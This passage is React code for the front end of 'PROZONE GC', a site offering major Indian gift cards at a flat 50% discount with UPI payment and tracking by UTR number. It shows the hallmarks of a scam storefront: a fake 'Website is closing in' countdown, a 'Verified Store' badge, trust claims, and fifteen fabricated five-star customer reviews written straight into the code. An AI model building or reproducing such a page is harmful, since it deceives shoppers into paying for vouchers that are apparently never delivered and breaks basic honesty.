                  className="inline-flex items-center gap-2 px-4 py-1.5 bg-red-50 dark:bg-red-900/20 text-red-700 dark:text-red-400 rounded-full text-[10px] sm:text-xs font-black uppercase tracking-widest border border-red-100 dark:border-red-800"
                >
                  <Clock size={14} className="fill-red-700 dark:fill-red-400 text-white dark:text-gray-900" />
                  Website is closing in {closingTime}
                </motion.div>
                
                <h1 className="text-4xl sm:text-6xl font-black tracking-tight text-gray-900 dark:text-white leading-tight">
                  Premium <span className="text-indigo-600 dark:text-indigo-400">Gift Cards</span> at Half Price.
                </h1>
                
                <p className="text-sm sm:text-lg text-gray-500 dark:text-gray-400 leading-relaxed px-4">
                  India's most trusted marketplace for discounted gift vouchers. Instant delivery via SMS & Email.
                </p>
              </div>
            </div>
          </header>

          {/* Quick Access Floating Buttons */}
          <div className="max-w-7xl mx-auto px-4 sm:px-6 lg:px-8 -mt-8 sm:-mt-12 relative z-20">
            <div className="flex flex-wrap justify-center gap-3 sm:gap-4">
              {[
                { name: 'TRACK ORDER', icon: <Clock size={18} />, color: 'bg-indigo-600', action: () => setActiveView('track') },
                { name: 'REVIEWS', icon: <Star size={18} />, color: 'bg-yellow-500', action: () => setActiveView('reviews') },
                { name: 'MY CODES', icon: <Wallet size={18} />, color: 'bg-purple-600', action: () => setActiveView('my-codes') },
              ].map((item, idx) => (
                <motion.button
                  key={item.name}
                  initial={{ opacity: 0, y: 20 }}
                  animate={{ opacity: 1, y: 0 }}
                  transition={{ delay: idx * 0.1 }}
                  whileHover={{ y: -4, scale: 1.02 }}
                  whileTap={{ scale: 0.98 }}
                  onClick={item.action}
                  className="flex items-center gap-2 px-4 py-2.5 sm:px-6 sm:py-3 bg-white dark:bg-gray-800 rounded-2xl shadow-lg dark:shadow-none border border-gray-100 dark:border-gray-700 hover:border-indigo-200 dark:hover:border-indigo-500 transition-all group"
                >
                  <div className={`w-8 h-8 sm:w-10 sm:h-10 rounded-xl ${item.color} text-white flex items-center justify-center shadow-md group-hover:scale-110 transition-transform`}>
                    {item.icon}
                  </div>
                  <span className="text-[10px] sm:text-xs font-black tracking-widest text-gray-700 dark:text-gray-300">{item.name}</span>
                </motion.button>
              ))}
            </div>
          </div>

          {/* Brand Selection Grid */}
          <main className="max-w-7xl mx-auto px-4 sm:px-6 lg:px-8 py-12 sm:py-16">
            <div className="grid grid-cols-2 sm:grid-cols-3 lg:grid-cols-5 gap-4 sm:gap-6">
              {BRANDS.map((brand, index) => (
                <motion.button
                  key={brand.name}
                  initial={{ opacity: 0, y: 20 }}
                  animate={{ opacity: 1, y: 0 }}
                  transition={{ delay: index * 0.05 }}
                  whileHover={{ y: -5 }}
                  onClick={() => handleBrandClick(brand.name)}
                  className="group relative bg-white dark:bg-gray-900 p-6 sm:p-8 rounded-3xl border border-gray-200 dark:border-gray-800 shadow-sm hover:shadow-xl dark:hover:shadow-indigo-900/20 transition-all flex flex-col items-center text-center space-y-4 overflow-hidden"
                >
                  <div className={`relative z-10 w-14 h-14 sm:w-16 sm:h-16 rounded-2xl flex items-center justify-center text-white shadow-lg ${brand.color}`}>
                    {brand.icon}
                  </div>
                  <div className="relative z-10">
                    <h3 className="font-black text-gray-900 dark:text-white text-sm sm:text-base">{brand.name}</h3>
                    <p className="text-[10px] font-bold text-indigo-600 dark:text-indigo-400 uppercase tracking-widest mt-1">Flat 50% Off</p>
                  </div>
                  <div className="relative z-10 pt-2 opacity-0 group-hover:opacity-100 transition-opacity">
                    <ChevronRight size={16} className="text-gray-400 dark:text-gray-500" />
                  </div>
                </motion.button>
              ))}
            </div>

            {/* Trust Badges */}
            <section className="mt-24 sm:mt-32 grid grid-cols-1 md:grid-cols-3 gap-8 sm:gap-12">
              <div className="p-8 bg-white dark:bg-gray-900 rounded-3xl border border-gray-100 dark:border-gray-800 space-y-4">
                <div className="w-12 h-12 bg-orange-100 dark:bg-orange-900/20 text-orange-600 dark:text-orange-400 rounded-2xl flex items-center justify-center">
                  <Zap size={24} />
                </div>
                <h3 className="text-lg font-bold dark:text-white">Instant SMS Delivery</h3>
                <p className="text-sm text-gray-500 dark:text-gray-400 leading-relaxed">Your voucher code is sent directly to your phone within seconds of verification.</p>
              </div>
              <div className="p-8 bg-white dark:bg-gray-900 rounded-3xl border border-gray-100 dark:border-gray-800 space-y-4">
                <div className="w-12 h-12 bg-indigo-100 dark:bg-indigo-900/20 text-indigo-600 dark:text-indigo-400 rounded-2xl flex items-center justify-center">
                  <ShieldCheck size={24} />
                </div>
                <h3 className="text-lg font-bold dark:text-white">Safe UPI Payments</h3>
                <p className="text-sm text-gray-500 dark:text-gray-400 leading-relaxed">Pay securely using any UPI app. We never store your payment details.</p>
              </div>
              <div className="p-8 bg-white dark:bg-gray-900 rounded-3xl border border-gray-100 dark:border-gray-800 space-y-4">
                <div className="w-12 h-12 bg-green-100 dark:bg-green-900/20 text-green-600 dark:text-green-400 rounded-2xl flex items-center justify-center">
                  <Smartphone size={24} />
                </div>
                <h3 className="text-lg font-bold dark:text-white">24/7 Live Support</h3>
                <p className="text-sm text-gray-500 dark:text-gray-400 leading-relaxed">Need help? Our team is available on WhatsApp and Email around the clock.</p>
              </div>
            </section>

            {/* Referral Section */}
            <div id="referral">
              <ReferralSection />
            </div>
          </main>
        </motion.div>
      ) : activeView === 'brand' ? (
        <motion.div 
          initial={{ opacity: 0, x: 20 }} 
          animate={{ opacity: 1, x: 0 }}
          className="pb-24"
        >
          {/* Header */}
          <div className="bg-white dark:bg-gray-900 border-b border-gray-100 dark:border-gray-800">
            <div className="max-w-7xl mx-auto px-4 sm:px-6 lg:px-8 py-8 sm:py-12">
              <button 
                onClick={handleBack}
                className="flex items-center gap-2 text-xs font-black text-gray-400 dark:text-gray-500 uppercase tracking-widest hover:text-indigo-600 dark:hover:text-indigo-400 transition-colors mb-6"
              >
                <ArrowLeft size={16} /> Back to Brands
              </button>
              <div className="flex flex-col sm:flex-row sm:items-center justify-between gap-6">
                <div>
                  <h1 className="text-3xl sm:text-5xl font-black tracking-tight text-gray-900 dark:text-white">{selectedBrand} Vouchers</h1>
                  <p className="text-xs sm:text-sm text-gray-500 dark:text-gray-400 mt-2 font-medium">All cards are currently at flat 50% discount. Instant delivery guaranteed.</p>
                </div>
                <div className="flex items-center gap-4">
                  <div className="px-4 py-2 bg-green-50 dark:bg-green-900/20 text-green-700 dark:text-green-400 rounded-xl text-xs font-black flex items-center gap-2 border border-green-100 dark:border-green-800">
                    <ShieldCheck size={14} /> Verified Store
                  </div>
                </div>
              </div>
            </div>
          </div>

          {/* Vouchers Grid */}
          <main className="max-w-7xl mx-auto px-4 sm:px-6 lg:px-8 py-12">
            <div className="grid grid-cols-1 sm:grid-cols-2 lg:grid-cols-3 gap-6 sm:gap-8">
              {filteredCards.map((card, index) => (
                <motion.div
                  key={card.id}
                  initial={{ opacity: 0, y: 20 }}
                  animate={{ opacity: 1, y: 0 }}
                  transition={{ delay: index * 0.05 }}
                  className="group bg-white dark:bg-gray-900 rounded-3xl border border-gray-200 dark:border-gray-800 shadow-sm hover:shadow-xl dark:hover:shadow-indigo-900/20 transition-all overflow-hidden flex flex-col"
                >
                  <div className={`p-8 sm:p-10 flex flex-col items-center justify-center text-white relative overflow-hidden ${card.color}`}>
                    <div className="relative z-10 flex flex-col items-center">
                      <div className="w-16 h-16 bg-white/20 backdrop-blur-md rounded-2xl flex items-center justify-center mb-4 shadow-inner">
                        {BRANDS.find(b => b.name === card.brand)?.icon}
                      </div>
                      <h3 className="text-xl sm:text-2xl font-black tracking-tight">{card.brand}</h3>
                      <div className="mt-4 bg-black/20 px-4 py-1.5 rounded-full text-sm font-black">
                        ₹{card.amount} Card
                      </div>
                    </div>
                  </div>
                  
                  <div className="p-6 sm:p-8 flex-1 flex flex-col justify-between space-y-6">
                    <div className="flex justify-between items-center">
                      <div>
                        <p className="text-[10px] font-black text-gray-400 dark:text-gray-500 uppercase tracking-widest mb-1">Original Price</p>
                        <p className="text-xl font-black text-gray-400 dark:text-gray-500 line-through">₹{card.amount}</p>
                      </div>
                      <div className="text-right">
                        <p className="text-[10px] font-black text-indigo-600 dark:text-indigo-400 uppercase tracking-widest mb-1">Offer Price</p>
                        <p className="text-2xl font-black text-indigo-600 dark:text-indigo-400">₹{card.discountPrice}</p>
                      </div>
                    </div>

                    <div className="space-y-4">
                      <div className="flex items-center gap-2 text-xs font-bold text-gray-500 dark:text-gray-400">
                        <CheckCircle2 size={14} className="text-green-500" /> Instant Code Delivery
                      </div>
                      <div className="flex items-center gap-2 text-xs font-bold text-gray-500 dark:text-gray-400">
                        <CheckCircle2 size={14} className="text-green-500" /> Valid for 1 Year
                      </div>
                      <button 
                        onClick={() => setSelectedCard(card)}
                        className={`w-full py-4 rounded-2xl text-white font-black text-sm transition-all shadow-lg active:scale-95 flex items-center justify-center gap-2 ${card.color} ${BRANDS.find(b => b.name === card.brand)?.hoverColor}`}
                      >
                        Buy Now <ArrowRight size={18} />
                      </button>
                    </div>
                  </div>
                </motion.div>
              ))}
            </div>
          </main>
        </motion.div>
      ) : activeView === 'track' ? (
        <motion.div initial={{ opacity: 0, y: 20 }} animate={{ opacity: 1, y: 0 }} className="max-w-2xl mx-auto px-4 py-16">
          <div className="bg-white dark:bg-gray-900 p-8 sm:p-12 rounded-3xl border border-gray-200 dark:border-gray-800 shadow-xl dark:shadow-none space-y-8">
            <div className="text-center space-y-2">
              <h2 className="text-3xl font-black text-gray-900 dark:text-white">Track Your Order</h2>
              <p className="text-sm text-gray-500 dark:text-gray-400 font-medium">Enter your 12-digit UTR number to check delivery status.</p>
            </div>
            <div className="space-y-4">
              <div className="space-y-2">
                <label className="text-[10px] font-black text-gray-400 dark:text-gray-500 uppercase tracking-widest">UTR Number</label>
                <input 
                  type="text" 
                  maxLength={12}
                  placeholder="e.g. 123456789012"
                  className="w-full px-6 py-4 bg-gray-50 dark:bg-gray-800 border border-gray-200 dark:border-gray-700 rounded-2xl font-mono text-lg focus:ring-2 focus:ring-indigo-500 outline-none transition-all dark:text-white"
                />
              </div>
              <button className="w-full py-4 bg-indigo-600 text-white rounded-2xl font-black shadow-lg shadow-indigo-200 dark:shadow-none hover:bg-indigo-700 transition-all flex items-center justify-center gap-2">
                <TrendingUp size={20} /> Sync Status
              </button>
            </div>
            <div className="pt-6 border-t border-gray-100 dark:border-gray-800 flex items-center justify-center gap-2 text-[10px] font-black text-gray-400 dark:text-gray-500 uppercase tracking-widest">
              <ShieldCheck size={14} /> Secure Verification
            </div>
          </div>
        </motion.div>
      ) : activeView === 'reviews' ? (
        <motion.div initial={{ opacity: 0, y: 20 }} animate={{ opacity: 1, y: 0 }} className="max-w-4xl mx-auto px-4 py-16">
          <div className="text-center mb-12 space-y-4">
            <h2 className="text-3xl sm:text-5xl font-black text-gray-900 dark:text-white">Customer Reviews</h2>
            <p className="text-sm text-gray-500 dark:text-gray-400 font-medium">See what our community is saying about PROZONE GC.</p>
          </div>
          <div className="grid grid-cols-1 sm:grid-cols-2 gap-6">
            {[
              { name: 'Rajesh Kumar', text: 'Got my Amazon card in 2 minutes. Legit!', city: 'Delhi' },
              { name: 'Sunita Sharma', text: 'Flipkart voucher worked perfectly. 50% off is insane.', city: 'Mumbai' },
              { name: 'Manoj Singh', text: 'Best place to buy gift cards. Very fast delivery.', city: 'Bangalore' },
              { name: 'Divya Patel', text: 'Was skeptical at first but received my Google Play code instantly.', city: 'Ahmedabad' },
              { name: 'Harish Reddy', text: 'Zomato card saved me a lot on dinner today. Thanks!', city: 'Hyderabad' },
              { name: 'Pooja Gupta', text: 'Smooth transaction. UPI payment is very convenient.', city: 'Pune' },
              { name: 'Vinod Verma', text: 'Highly recommended for anyone looking for cheap gift cards.', city: 'Chennai' },
              { name: 'Megha Iyer', text: 'Customer support was helpful when I had a query about UTR.', city: 'Kolkata' },
              { name: 'Sandeep Joshi', text: 'The 50% discount is real. Just bought my third card.', city: 'Jaipur' },
              { name: 'Tanvi Malhotra', text: 'Instant SMS delivery is the best feature here.', city: 'Lucknow' },
              { name: 'Ajay Saxena', text: 'Very reliable service. Will buy again.', city: 'Indore' },
              { name: 'Shweta Mishra', text: 'Great experience. The website is very easy to use.', city: 'Bhopal' },
              { name: 'Nitin Pandey', text: 'Finally a site that actually delivers discounted cards.', city: 'Patna' },
              { name: 'Rashmi Das', text: 'Saved 2000 rupees on my shopping today. Awesome!', city: 'Guwahati' },
              { name: 'Gaurav Bhatia', text: 'The tracking feature is very helpful to see status.', city: 'Chandigarh' },
            ].map((review, idx) => (
              <motion.div 
                key={idx} 
                initial={{ opacity: 0, scale: 0.9 }} 
                animate={{ opacity: 1, scale: 1 }} 
                transition={{ delay: idx * 0.05 }}
                className="bg-white dark:bg-gray-900 p-6 rounded-3xl border border-gray-100 dark:border-gray-800 shadow-sm space-y-4"
              >
                <div className="flex items-center justify-between">
                  <div className="flex items-center gap-3">
                    <div className="w-10 h-10 bg-indigo-100 dark:bg-indigo-900/20 text-indigo-600 dark:text-indigo-400 rounded-full flex items-center justify-center font-black text-sm">
                      {review.name[0]}
                    </div>
                    <div>
                      <p className="text-sm font-black text-gray-900 dark:text-white">{review.name}</p>
                      <p className="text-[10px] text-gray-400 dark:text-gray-500 font-bold uppercase tracking-widest">{review.city}</p>
                    </div>
                  </div>
                  <div className="flex text-yellow-400">
                    {[...Array(5)].map((_, i) => <Star key={i} size={12} fill="currentColor" />)}
                  </div>
                </div>
                <p className="text-sm text-gray-600 dark:text-gray-400 leading-relaxed italic">"{review.text}"</p>
              </motion.div>
            ))}
          </div>
        </motion.div>
      ) : (
        <motion.div initial={{ opacity: 0, y: 20 }} animate={{ opacity: 1, y: 0 }} className="max-w-2xl mx-auto px-4 py-24 text-center space-y-8">
          <div className="w-24 h-24 bg-gray-100 dark:bg-gray-900 text-gray-400 dark:text-gray-600 rounded-full flex items-center justify-center mx-auto">
            <ShoppingBag size={48} />
          </div>
          <div className="space-y-2">
            <h2 className="text-3xl font-black text-gray-900 dark:text-white">No Purchased Cards</h2>
            <p className="text-gray-500 dark:text-gray-400 font-medium">You don't have purchased any gift card yet. Start shopping now to see your codes here.</p>
          </div>
          <button 
            onClick={() => setActiveView('home')}
            className="px-10 py-4 bg-indigo-600 text-white rounded-2xl font-black shadow-lg shadow-indigo-200 dark:shadow-none hover:bg-indigo-700 transition-all flex items-center justify-center gap-2 mx-auto"
          >
            Go to Shop <ArrowRight size={20} />
          </button>
        </motion.div>
      )}

      {/* Footer */}
      <footer className="bg-white dark:bg-gray-900 border-t border-gray-200 dark:border-gray-800 pt-16 pb-10">
        <div className="max-w-7xl mx-auto px-4 sm:px-6 lg:px-8">
          <div className="grid grid-cols-1 sm:grid-cols-2 lg:grid-cols-4 gap-10 mb-12">
            <div className="col-span-1 sm:col-span-2 space-y-6">
              <div className="flex items-center gap-2">
                <div className="w-8 h-8 bg-indigo-600 rounded-lg flex items-center justify-center text-white">
                  <Gift size={18} />
                </div>
                <span className="text-lg font-black tracking-tight text-indigo-900 dark:text-indigo-100">PROZONE GC</span>
              </div>
              <p className="text-sm text-gray-500 dark:text-gray-400 max-w-sm leading-relaxed">
                India's premier marketplace for discounted digital gift vouchers. Trusted by thousands for instant delivery and best prices.
              </p>
            </div>
            
            <div>
              <h4 className="text-sm font-black uppercase tracking-widest text-gray-900 dark:text-white mb-6">Support</h4>
              <ul className="space-y-3 text-xs text-gray-500 dark:text-gray-400 font-bold">
                <li><a href="#" className="hover:text-indigo-600 dark:hover:text-indigo-400 transition-colors">Help Center</a></li>
                <li><a href="#" className="hover:text-indigo-600 dark:hover:text-indigo-400 transition-colors">Track Order</a></li>
                <li><a href="#" className="hover:text-indigo-600 dark:hover:text-indigo-400 transition-colors">Refund Policy</a></li>
              </ul>
            </div>

            <div>
              <h4 className="text-sm font-black uppercase tracking-widest text-gray-900 dark:text-white mb-6">Legal</h4>
              <ul className="space-y-3 text-xs text-gray-500 dark:text-gray-400 font-bold">
                <li><a href="#" className="hover:text-indigo-600 dark:hover:text-indigo-400 transition-colors">Terms of Use</a></li>
                <li><a href="#" className="hover:text-indigo-600 dark:hover:text-indigo-400 transition-colors">Privacy Policy</a></li>
                <li><a href="#" className="hover:text-indigo-600 dark:hover:text-indigo-400 transition-colors">Merchant Policy</a></li>
              </ul>
            </div>
          </div>
          
          <div className="pt-8 border-t border-gray-100 dark:border-gray-800 flex flex-col sm:flex-row justify-between items-center gap-4 text-center sm:text-left">
            <p className="text-[10px] text-gray-400 dark:text-gray-500 font-bold uppercase">© 2026 PROZONE GC India. All rights reserved.</p>
            <div className="flex items-center gap-4 text-[10px] font-black text-gray-300 dark:text-gray-600 uppercase tracking-widest">
              <span>Secure UPI</span>
              <span>•</span>
              <span>Instant Delivery</span>
            </div>
          </div>
        </div>
      </footer>
    </div>
  );
}
